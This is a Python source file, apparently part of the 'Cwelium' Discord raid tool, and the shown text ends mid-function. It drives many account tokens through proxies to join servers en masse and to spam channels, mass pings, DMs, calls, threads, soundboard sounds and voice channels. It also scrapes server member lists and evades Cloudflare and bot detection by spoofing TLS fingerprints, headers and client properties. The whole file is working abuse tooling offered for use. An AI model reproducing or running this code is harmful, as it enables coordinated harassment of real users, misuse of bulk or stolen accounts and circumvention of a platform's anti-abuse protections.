# Copyright (c) 2024-2025 Cwelium Inc.
# This project is licensed under the Cwelium License, which includes additional
# terms under the GNU Affero General Public License (AGPL) v3.0.
#
# Author: Tips-Discord
# Original Repository: https://github.com/Tips-Discord/Cwelium
#
# Additional Terms can be found at:
# https://github.com/Tips-Discord/Cwelium/blob/main/LICENSE

#from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init; init(autoreset=True)
from colorist import ColorHex as h
from datetime import datetime
import base64
import ctypes
import json
import os
import random
import re
import requests
import secrets
import string
import threading
import time
import tls_client
import uuid
import websocket

session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0", h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144}, h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"], supported_versions=["TLS_1_3", "TLS_1_2"], key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"], pseudo_header_order=[":method", ":authority", ":scheme", ":path"], connection_flow=15663105, priority_frames=[])

def get_random_str(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def wrapper(func):
    def wrapper(*args, **kwargs):
        console.clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
    "brown": h("#8B4513"),
    "black": h("#000000"),
    "aqua": h("#00CED1"),
    "purple": h("#800080"),
    "lime": h("#00FF00"),
    "orange": h("#FFA500"),
    "indigo": h("#4B0082"),
    "violet": h("#EE82EE"),
    "gold": h("#FFD700"),
    "silver": h("#C0C0C0"),
    "teal": h("#008080"),
    "navy": h("#000080"),
    "olive": h("#808000"),
    "maroon": h("#800000"),
    "coral": h("#FF7F50"),
    "salmon": h("#FA8072"),
    "khaki": h("#F0E68C"),
    "orchid": h("#DA70D6"),
    "rose": h("#FF007F")
}

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Theme": "light_blue", 
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = ["data", "scraped"]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                if not os.path.exists(file):
                    with open(f"data/{file}", "a") as f:
                        f.close()
            except Exception as e:
                console.log("Failed", C["red"], "Failed to Write Files", e)

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()

Files.run_tasks()

with open("config.json") as f:
    Config = json.load(f)
    
proxy = Config["Proxies"]
color = Config["Theme"]

class Render:
    def __init__(self):
        self.size = os.get_terminal_size().columns
        self.print_lock = threading.Lock()
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]

    def title(self, title):
        ctypes.windll.kernel32.SetConsoleTitleW(title)

    def clear(self):
        os.system("cls")
        
    def render_ascii(self):
        self.clear()
        self.title(f"Cwelium | Connected as {os.getlogin()} | made by Tips-Discord")
        edges = ["╗", "║", "╚", "╝", "═", "╔"]
        ascii = f"""
{' ██████╗██╗    ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗'.center(self.size)}
{'██╔════╝██║    ██║██╔════╝██║     ██║██║   ██║████╗ ████║'.center(self.size)}
{'██║     ██║ █╗ ██║█████╗  ██║     ██║██║   ██║██╔████╔██║'.center(self.size)}
{'██║     ██║███╗██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║'.center(self.size)}
{'╚██████╗╚███╔███╔╝███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║'.center(self.size)}
{' ╚═════╝ ╚══╝╚══╝ ╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝'.center(self.size)}
{''.center(self.size)}
"""
        
        for line in ascii.splitlines():
            for edge in edges:
                line = line.replace(edge, f"{self.background}{edge}{C['white']}")
            print(line)

    def raider_options(self):
        with open("data/proxies.txt") as f:
            global proxies
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            global tokens
            tokens = f.read().splitlines()

        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
        title = f"""{Fore.RESET}{' ' * max(0, (self.size - len(f'Loaded ‹{len(tokens)}› tokens | Loaded ‹{len(proxies)}› proxies')) // 2)}Loaded ‹{self.background}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{self.background}{len(proxies)}{Fore.RESET}› proxies

{'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
{'│ «01» Joiner            «07» Token Formatter    «13» Onliner           «19» Call Spammer     │'.center(self.size)}
{'│ «02» Leaver            «08» Button Click       «14» Voice Raper       «20» Bio Change       │'.center(self.size)}
{'│ «03» Spammer           «09» Accept Rules       «15» Change Nick       «21» Voice Joiner     │'.center(self.size)}
{'│ «04» Token Checker     «10» Guild Check        «16» Thread Spammer    «22» Onboard Bypass   │'.center(self.size)}
{'│ «05» Emoji Reaction    «11» Friend Spam        «17» Typer             «23» Dm Spammer       │'.center(self.size)}
{'│ «06» ???               «12» ???                «18» ???               «24» Exit             │'.center(self.size)}
{'╰─────────────────────────────────────────────────────────────────────────────────────────────╯'.center(self.size)}
{'«~» Credits'.center(self.size)}
"""
        for edge in edges:
            title = title.replace(edge, f"{self.background}{edge}{C['white']}")
        print(title)

    def run(self):
        options = [self.render_ascii(), self.raider_options()]
        ([option] for option in options)

    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"

        with self.print_lock:
            print(response)

    def prompt(self, text, ask=None):
        prompted = f"[{C[color]}{text}{C['white']}]"
        if ask:
            prompted += f" {C['gray']}(y/n){C['white']}: "
        else:
            prompted += ": "
            
        return prompted

console = Render()

# Big Thanks to Aniell4 for the scraper
class Utils:
    @staticmethod
    def range_corrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges

    @staticmethod
    def get_ranges(index, multiplier, member_count):
        initial_num = index * multiplier
        ranges = [[initial_num, initial_num + 99]]
        if member_count > initial_num + 99:
            ranges.append([initial_num + 100, initial_num + 199])
        return Utils.range_corrector(ranges)

    @staticmethod
    def parse_member_list_update(response):
        data = response["d"]
        member_data = {
            "online_count": data["online_count"],
            "member_count": data["member_count"],
            "id": data["id"],
            "guild_id": data["guild_id"],
            "hoisted_roles": data["groups"],
            "types": [op["op"] for op in data["ops"]],
            "locations": [],
            "updates": [],
        }

        for chunk in data["ops"]:
            op_type = chunk["op"]
            if op_type in {"SYNC", "INVALIDATE"}:
                member_data["locations"].append(chunk["range"])
                member_data["updates"].append(chunk["items"] if op_type == "SYNC" else [])
            elif op_type in {"INSERT", "UPDATE", "DELETE"}:
                member_data["locations"].append(chunk["index"])
                member_data["updates"].append(chunk["item"] if op_type != "DELETE" else [])

        return member_data

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", "1273658880039190581", "1308012310396407828", "1326906424873193586", "1334512667456442411", "1349869929809186846"}

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
        )

        self.end_scraping = False
        self.guilds = {}
        self.members = {}
        self.ranges = [[0, 0]]
        self.last_range = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever()
        return self.members

    def scrape_users(self):
        if not self.end_scraping:
            self.send(json.dumps({
                "op": 14,
                "d": {
                    "guild_id": self.guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": True,
                    "channels": {self.channel_id: self.ranges}
                }
            }))

    def on_open(self, ws):
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "it-IT",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
                    "browser_version": "138.0.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": 419434,
                    "client_event_source": None
                },
                "presence": {
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1
                }
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
            time.sleep(interval)

    def on_message(self, ws, message):
        decoded = json.loads(message)
        if not decoded:
            return

        self.packets_recv += decoded["op"] != 11

        if decoded["op"] == 10:
            threading.Thread(
                target=self.heartbeat_thread,
                args=(decoded["d"]["heartbeat_interval"] / 1000,),
                daemon=True,
            ).start()

        if decoded["t"] == "READY":
            self.guilds.update({
                guild["id"]: {"member_count": guild["member_count"]}
                for guild in decoded["d"]["guilds"]
            })

            total_members = self.guilds[self.guild_id]["member_count"]

            console.log("Info", C["yellow"], False, f"Guild has {total_members} members → ETA ~{round(total_members / 150, 1)}s")

        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100, self.guilds[self.guild_id]["member_count"])
            self.scrape_users()

        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            if parsed["guild_id"] == self.guild_id:
                self.process_updates(parsed)

    def process_updates(self, parsed):
        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
            for i, update_type in enumerate(parsed["types"]):
                if update_type in {"SYNC", "UPDATE"}:
                    if not parsed["updates"][i]:
                        self.end_scraping = True
                        break
                    self.process_members(parsed["updates"][i])

                self.last_range += 1
                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds[self.guild_id]["member_count"])
                self.scrape_users()

        if self.end_scraping:
            self.close()

    def process_members(self, updates):
        for item in updates:
            member = item.get("member")
            if member:
                user = member.get("user", {})
                user_id = user.get("id")
                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
                    self.members[user_id] = {
                        "tag": f"{user.get('username')}#{user.get('discriminator')}",
                        "id": user_id,
                    }

    def on_close(self, ws, close_code, close_msg):
        console.log("Success", C["green"], False, f"Scraped {len(self.members)} members")

def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()
    
class Raider:
    def __init__(self):
        self.build_number = 429117
        self.cf_token = self.get_cloudflare_cookies()
        self.cookies, self.fingerprint = self.get_discord_cookies()
        self.ws = websocket.WebSocket()

    def get_cloudflare_cookies(self):
        try:
            response = requests.get(
                "https://discord.com/channels/@me"
            )

            challange = re.sub(r".*r:'([^']+)'.*", r"\1", response.text, flags=re.DOTALL)
            build_number = re.sub(r'.*"BUILD_NUMBER":"(\d+)".*', r'\1', response.text, flags=re.DOTALL)
            if build_number is not None:
                self.build_number = build_number

            cf_token = requests.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{random.random():.16f}:{str(int(time.time()))}:{secrets.token_urlsafe(32)}/{challange}')
            match cf_token.status_code:
                case 200:
                    cookie = list(cf_token.cookies)[0]
                    return f"{cookie.name}={cookie.value}"
                case _:
                    console.log("ERROR", C["red"], "Failed to get cf_clearance")
        except Exception as e:
            console.log("ERROR", C["red"], "get_cf", e)

    def get_discord_cookies(self):
        try:
            response = requests.get(
                'https://discord.com/api/v9/experiments',
            )
            match response.status_code:
                case 200:
                    return "; ".join(
                        [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                    ) + f"; {self.cf_token}; locale=en-US", response.json()["fingerprint"]
                case _:
                    console.log("ERROR", C["red"], "Failed to get cookies using Static")
                    return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
        except Exception as e:
            console.log("ERROR", C["red"], "get_discord_cookies", e)

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Chrome",
                "release_channel": "stable",
                "os_version": "10",
                "system_locale": "pl",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
                "browser_version": "139.0.0.0",
                "client_build_number": int(self.build_number),
                "client_launch_id": str(uuid.uuid4()),
                "client_heartbeat_session_id": str(uuid.uuid4()),
                "launch_signature": str(uuid.uuid4()),
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log("ERROR", C["red"], "get_super_properties", e)

    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties(),
        }
    
    def nonce(self):
        return int(time.time() * 1000) - 1420070400000 << 22

    def joiner(self, invite):
        try:
            params = {
                "inputValue": f"https://discord.gg/{invite}",
                "with_counts": "true",
                "with_expiration": "true",
                "with_permissions": "true",
            }

            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/invites/{invite}",
                    headers=self.headers(token),
                    params=params
                )

                match response.status_code:
                    case 200:
                        invite_info = response.json()
                        break
                    case 404:
                        console.log("Failed", C["red"], "Invalid or expired invite")
                        input()
                        Menu().main_menu()
                        return

            guild_name = invite_info["guild"]["name"]
            guild_id = invite_info["guild"]["id"]
            channel_id = invite_info["channel"]["id"]
            channel_type = invite_info["channel"]["type"]

            join = {
                "location": "Join Guild",
                "location_guild_id": guild_id,
                "location_channel_id": channel_id,
                "location_channel_type": channel_type
            }
            context = base64.b64encode(json.dumps(join).encode()).decode()

            def join_server(token):
                try:
                    headers = self.headers(token)
                    headers["X-Context-Properties"] = context

                    payload = {
                        "session_id": uuid.uuid4().hex
                    }

                    resp = session.post(
                        f"https://discord.com/api/v9/invites/{invite}",
                        headers=headers,
                        json=payload
                    )

                    match resp.status_code:
                        case 200:
                            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        case 400:
                            console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        case 429:
                            console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
                        case _:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json()["message"])
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(join_server, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get invite info", e)
            input()
            Menu().main_menu()

    def leaver(self, token, guild):
        try:
            def get_guild_name(guild):
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild}",
                    headers=self.headers(token)
                )

                match response.status_code:
                    case 200:
                        try:
                            return response.json()["name"]
                        except:
                            return guild
                
            self.guild = get_guild_name(guild)

            payload = {
                "lurking": False,
            }

            response = session.delete(
                f"https://discord.com/api/v9/users/@me/guilds/{guild}",
                json=payload,
                headers=self.headers(token)
            )

            match response.status_code:
                case 204:
                    console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
                case 429:
                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"discord.gg/{invite}")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, random_str=None, delay=None):
        try:
            while True:
                if massping:
                    msg = self.get_random_members(guild, int(pings))

                    payload = {
                        "content": f"{message} {msg}"
                    }
                else:
                    payload = {
                        "content": f"{message}"
                    }
                
                if random_str:
                    payload["content"] += f" > {get_random_str(15)}"

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel}/messages",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        if delay:
                            time.sleep(delay)
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def member_scrape(self, guild_id, channel_id):
        try:
            in_guild = []

            if not os.path.exists(f"scraped/{guild_id}.json"):
                for token in tokens:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token),
                    )

                    match response.status_code:
                        case 200:
                            in_guild.append(token)
                            break

                if not in_guild:
                    console.log("Failed", C["red"], "Missing Access")
                token = random.choice(in_guild)
                members = scrape(token, guild_id, channel_id)

                with open(f"scraped/{guild_id}.json", "w") as f:
                    json.dump(list(members.keys()), f, indent=2)
        except Exception as e:
            console.log("Failed", C["red"], False, e)

    def get_random_members(self, guild_id, count):
        try:
            with open(f"scraped/{guild_id}.json") as f:
                members = json.load(f)

            message = ""
            for _ in range(int(count)):
                message += f"<@!{random.choice(members)}>"
            return message
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get Random Members", e)

    def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
        try:
            self.onliner(token, ws)
            ws.send(
                json.dumps(
                    {
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": False,
                            "self_deaf": False,
                            "self_stream": False,
                            "self_video": True,
                        },
                    }
                )
            )

            ws.send(
                json.dumps(
                    {
                        "op": 18,
                        "d": {
                            "type": "guild",
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "preferred_region": "singapore",
                        },
                    }
                )
            )
            
            ws.send(json.dumps({"op": 1, "d": None}))
            if close:
                ws.close()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def vc_joiner(self, token, guild, channel, ws):
        try:
            for _ in range(1):
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "os": "windows",
                            "browser": "Discord",
                            "device": "desktop"
                        }
                    }
                }))

                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild,
                        "channel_id": channel,
                        "self_mute": random.choice([True, False]),
                        "self_deaf": False
                    }
                }))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onliner(self, token, ws):
        try:
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "os": "Windows",
                            },
                            "presence": {
                                "game": {
                                    "name": "Cwelium",
                                    "type": 0,
                                },
                                "status": random.choice(['online', 'dnd', 'idle']),
                                "since": 0,
                                "afk": False
                            }
                        },
                    }
                )
            )

            console.log("Onlined", C[color], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def join_voice_channel(self, token, guild_id, channel_id):
        ws = websocket.WebSocket()

        def check_for_guild(token):
            response = session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}", 
                headers=self.headers(token)
            )
            match response.status_code:
                case 200:
                    return True
                case _:
                    return False

        def check_for_channel(token):
            if check_for_guild(token):
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}", 
                    headers=self.headers(token)
                )

                match response.status_code:
                    case 200:
                        return True
                    case _:
                        return False

        if check_for_channel(token):
            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            self.vc_joiner(token, guild_id, channel_id, ws)
        else:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")

    def soundbord(self, token, channel):
        try:
            sounds = session.get(
                "https://discord.com/api/v9/soundboard-default-sounds",
                headers=self.headers(token)
            ).json()

            time.sleep(1)

            while True:
                sound = random.choice(sounds)

                payload = {
                    "emoji_id": None,
                    "emoji_name": sound["emoji_name"],
                    "sound_id": sound["sound_id"],
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound", 
                    headers=self.headers(token), 
                    json=payload,
                )

                match response.status_code:
                    case 204:
                        console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        break
                time.sleep(random.uniform(0.56, 0.75))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def open_dm(self, token, user_id):
        try:
            payload = {
                "recipients": [f'{user_id}'],
            }

            response = session.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=self.headers(token),
                json=payload
            )

            match response.status_code:
                case 200:
                    return response.json()["id"]
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def call_spammer(self, token, user_id):
        try:
            while True:
                channel_id = self.open_dm(token, user_id)

                json_data = {
                    'recipients': None,
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/call",
                    headers=self.headers(token),
                    json=json_data,
                )

                match response.status_code:
                    case 200:
                        console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                        ws = websocket.WebSocket()
                        self.voice_spammer(token, ws, channel_id, channel_id, True)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        return
                time.sleep(5)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def dm_spammer(self, token, user_id, message):
        try:
            channel_id = self.open_dm(token, user_id)

            while True:
                payload = {
                    "content": message,
                    "nonce": self.nonce(),
                }

                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("Send", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))  
                        break
                time.sleep(7)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def format_tokens(self):
        try:
            formatted = []

            for token in tokens:
                token = token.strip()

                if token:
                    tokens_split = token.split(":")
                    if len(tokens_split) >= 3:
                        formatted_token = tokens_split[2]
                        formatted.append(formatted_token)
                    else:
                        formatted.append(token)

            console.log("Success", C["green"], f"Formatted {len(formatted)} tokens")

            with open("data/tokens.txt", "w") as f:
                for token in formatted:
                    f.write(f"{token}\n")

            Menu().main_menu()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def bio_changer(self, token, bio):
        try:
            payload = {
                "bio": bio
            }

            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=self.headers(token),
                json=payload
            )

            match response.status_code:
                case 200:
                    console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
                case 429:
                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                "nick" : nick
            }

            response = session.patch(
                f"https://discord.com/api/v9/guilds/{guild}/members/@me", 
                headers=self.headers(token),
                json=payload
            )

            match response.status_code:
                case 200:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }

            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 201:
                        console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        if int(retry_after) > 10:
                            console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                            break
                        else:
                            console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                            time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channel_id):
        try:
            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/typing", 
                    headers=self.headers(token)
                )

                match response.status_code: 
                    case 204:
                        console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
